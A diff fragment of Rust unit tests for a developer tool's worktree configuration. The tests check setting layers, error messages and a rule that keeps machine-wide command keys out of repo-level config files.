         assert_eq!(dev_url(from_machine.dev_url.value.as_deref(), Path::new("/src/app"), Path::new("/src/wt1.app")).as_deref(), Some("https://wt1.app.dev"));
         let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: off });
-        assert!(shown.contains("worktree.dev_url = \"\" (no link)  (.kelpie.toml)"), "{shown}");
+        assert!(shown.contains("worktree.dev_url = \"\" (no link)  (repo config)"), "{shown}");
     }
 
     #[test]
     fn an_unknown_placeholder_is_refused_when_loading_with_the_key_named() {
-        let refused = parse_repo("[worktree]\ndev_url = \"https://{branch}.dev\"\n", "/src/app/.kelpie.toml").unwrap_err();
-        assert_eq!(refused, "/src/app/.kelpie.toml: worktree.dev_url: {branch} is not a placeholder; use {worktree}, {repo}, {number} or {port}");
+        let refused = parse_repo("[worktree]\ndev_url = \"https://{branch}.dev\"\n", "/home/u/.config/kelpie/repos/app.toml").unwrap_err();
+        assert_eq!(refused, "/home/u/.config/kelpie/repos/app.toml: worktree.dev_url: {branch} is not a placeholder; use {worktree}, {repo}, {number} or {port}");
         assert!(parse_machine("[worktree]\ndev_url = \"http://localhost:{port\"\n", "config.toml").unwrap_err().contains("worktree.dev_url: \"http://localhost:{port\" opens a { it never closes"));
         assert!(parse_machine("[worktree]\ndev_url = 3000\n", "config.toml").unwrap_err().contains("worktree.dev_url: must be a string"));
     }
@@ -777,10 +834,10 @@ mod tests {
         let both = settings(&repo("[worktree]\nsetup_command = \"script/prepare_worktree\"\n"), &from_machine);
         assert_eq!(both.setup_command, Setting { value: Some("script/prepare_worktree".to_string()), layer: Layer::Repo });
         assert_eq!(settings(&repo("[worktree]\ndev_server = \"bin/dev\"\n"), &from_machine).setup_command.layer, Layer::Machine);
-        assert!(parse_repo("[worktree]\nsetup_command = \" \"\n", ".kelpie.toml").unwrap_err().contains("worktree.setup_command: must not be empty"));
+        assert!(parse_repo("[worktree]\nsetup_command = \" \"\n", "app.toml").unwrap_err().contains("worktree.setup_command: must not be empty"));
         assert!(parse_machine("[worktree]\nsetup_command = [\"x\"]\n", "config.toml").unwrap_err().contains("worktree.setup_command: must be a string"));
         let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: both });
-        assert!(shown.contains("worktree.setup_command = \"script/prepare_worktree\"  (.kelpie.toml)\n  The repo's own command that prepares an existing worktree"), "{shown}");
+        assert!(shown.contains("worktree.setup_command = \"script/prepare_worktree\"  (repo config)\n  The repo's own command that prepares an existing worktree"), "{shown}");
         let default = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
         assert!(default.contains("worktree.setup_command = none  (default)\n  "), "{default}");
         assert!(default.contains("A path applies only in a repo that has the file; elsewhere, and when none, bin/setup-worktree when the repo has one."));
@@ -790,9 +847,9 @@ mod tests {
     fn dev_worker_layers_like_dev_server() {
         let both = settings(&repo("[worktree]\ndev_worker = \"bin/jobs\"\n"), &machine("[worktree]\ndev_worker = \"npm run worker\"\n"));
         assert_eq!(both.dev_worker, Setting { value: Some("bin/jobs".to_string()), layer: Layer::Repo });
-        assert!(parse_repo("[worktree]\ndev_worker = \"\"\n", ".kelpie.toml").unwrap_err().contains("worktree.dev_worker: must not be empty"));
+        assert!(parse_repo("[worktree]\ndev_worker = \"\"\n", "app.toml").unwrap_err().contains("worktree.dev_worker: must not be empty"));
         let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: both });
-        assert!(shown.contains("worktree.dev_worker = \"bin/jobs\"  (.kelpie.toml)\n  A second command"), "{shown}");
+        assert!(shown.contains("worktree.dev_worker = \"bin/jobs\"  (repo config)\n  A second command"), "{shown}");
         assert!(shown.contains("worktree.dev_url = \"http://localhost:{port}\"  (default)"), "{shown}");
     }
 
@@ -802,7 +859,7 @@ mod tests {
         let resolved = settings(&Worktree::default(), &machine);
         assert_eq!(resolved.server_name, Setting { value: "web".to_string(), layer: Layer::Machine });
         assert_eq!(resolved.worker_name, Setting { value: DEFAULT_WORKER_NAME.to_string(), layer: Layer::Default });
-        assert!(parse_repo("[worktree]\nserver_name = \"web\"\n", "repo").unwrap_err().contains("machine config only"));
+        assert!(parse_repo("[worktree]\nserver_name = \"web\"\n", "repo").unwrap_err().contains("lives in config.toml"));
     }
 
     #[test]
@@ -839,9 +896,9 @@ mod tests {
     }
 
     #[test]
-    fn a_repo_file_cannot_smuggle_a_machine_only_key_under_another_table() {
+    fn a_repo_config_cannot_hold_a_machine_wide_key_under_another_table() {
         for text in ["[worktree]\nnotify_command = \"x\"\n", "[worktree]\nvault_command = \"x\"\n", "[task]\nnotify = \"x\"\n", "[review]\ncommand = \"x\"\n", "[board]\nbacklog = {}\n"] {
-            assert!(parse_repo(text, ".kelpie.toml").is_err(), "{text}");
+            assert!(parse_repo(text, "app.toml").is_err(), "{text}");
         }
         let smuggled = Worktree { vault_command: Some("evil".to_string()), notify_command: Some("evil".to_string()), server_name: Some("x".to_string()), worker_name: Some("y".to_string()), ..Worktree::default() };
         let resolved = settings(&smuggled, &Machine::default());
